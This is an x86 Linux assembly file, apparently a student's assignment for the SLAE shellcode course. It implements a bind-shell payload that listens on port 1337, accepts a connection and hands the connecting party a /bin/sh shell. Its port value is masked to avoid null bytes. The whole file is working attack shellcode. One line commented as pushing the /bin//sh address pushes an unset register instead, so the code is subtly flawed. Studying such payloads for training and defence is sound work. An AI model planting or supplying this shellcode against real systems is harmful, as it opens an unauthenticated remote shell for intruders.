; Filename: shell_bind_tcp.nasm
; Author:   Stylianos Voukatas
; Website:  https://vostdev.wordpress.com/
;
; Purpose:  Assignment 1 for SLAE
; SLAE:     http://securitytube-training.com/onlinecourses/securitytube-linux-assembly-expert/

; Student ID: PA-27669

global _start			

section .text
_start:

	; set registers	to zero
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	;socket section
	mov ax, 0x167	; set num for socket interrupt
	mov bl, 0x02	; set domain IPv4 Protocol, try also 0x00 for both v4 and v6, also one less instruction
	mov cl, 0x01	; set type
	; edx is zero    ; set protocol, leave it 0 so it will select on its own based on the type

	int 0x80	; interrupt for socket()


	; eax will hold our file descriptor (fd)
	mov esi, eax	; store fd	

	; bind section
	
	; construct the struct sockaddr_in
	push edx	; padding 4 bytes
	push edx	; padding 4 bytes
	push edx	; address field, set to 0.0.0.0 to bind to all interfaces

	; port 1337 is in little endian 0x3905
        ; we XOR the address using a mask of 0xffff and we get 0xc6fa
        ; in order to restore the initial value we need to XOR again with the mask
        ; this is done to avoid null characters in case our port contain 0

	mov eax, 0xffffffff
	xor ax, 0xc6fa
	push ax		; port number in little endian format
	push word 0x02	; address family

	mov ecx, esp	; save the struct address in stack

	mov dl, 0x10	; size of struct, 16 bytes (padding + address + port + family)

	mov ebx, esi	; set fd

	xor eax, eax
	mov ax, 0x0169	; set num for bind interrupt

	int 0x80
	

	; listen section
	xor eax, eax
	mov ebx, esi	; set fd
	xor ecx, ecx	
	mov ax, 0x16b	; set num for listen interrupt

	int 0x80

	; accept section
	xor eax, eax
	mov ebx, esi	; set fd
	;push eax	; we don't need to hold the info for the received addr bytes
	;push eax	; addr bytes
	;push eax	; addr bytes
	;push eax	; addr bytes

	xor ecx, ecx	; sockaddr
	;mov ecx, esp
	mov edx, ecx	; addrlen
	mov esi, eax	; flags

	mov ax, 0x16c	; set num for accept interrupt

	int 0x80


	xor ebx, ebx
	mov ebx, eax	; save the new fd from accept	

	; dup2 section
	
	; consider a loop here
	xor eax, eax
	mov al, 0x3f
	xor ecx, ecx	; dup2(fd,0)
	
	int 0x80
	

	xor eax, eax
	mov al, 0x3f
	inc ecx		; dup2(fd,1)
	
	int 0x80

	xor eax, eax
	mov al, 0x3f
	inc ecx		; dup2(fd,2)
	
	int 0x80



	; execve section

	xor eax, eax
	
	push eax	; push \0 in stack

	; /bin//sh	
	push 0x68732f2f
	push 0x6e69622f

	mov ebx, esp

	push eax	; push 0 in stack
	mov edx, esp

	push ebp	; push the address of /bin//sh in stack

	mov ecx, esp	; put the address of args in ecx


	mov al, 0xb
	int 0x80




